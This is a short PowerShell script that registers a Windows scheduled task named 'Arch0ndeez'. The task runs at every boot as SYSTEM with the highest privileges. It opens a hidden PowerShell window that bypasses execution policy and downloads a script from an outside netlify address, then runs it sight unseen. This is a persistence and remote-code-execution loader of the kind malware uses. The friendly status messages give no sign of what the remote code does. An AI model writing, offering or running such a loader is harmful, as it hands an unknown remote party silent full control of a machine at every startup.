Write-Host "Setting up scheduled task: Arch0ndeez..."

# Delete the existing task if it's already there (avoids duplicate errors)
cmd.exe /c "schtasks /delete /tn Arch0ndeez /f >nul 2>nul"

# Create the new task using native Windows schtasks
schtasks /create /f /tn "Arch0ndeez" /sc onstart /ru SYSTEM /rl HIGHEST /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command 'irm https://ahmadsan.netlify.app/SetExt.ps1 | iex'"

Write-Host "Success! The task Arch0ndeez is now active." -ForegroundColor Green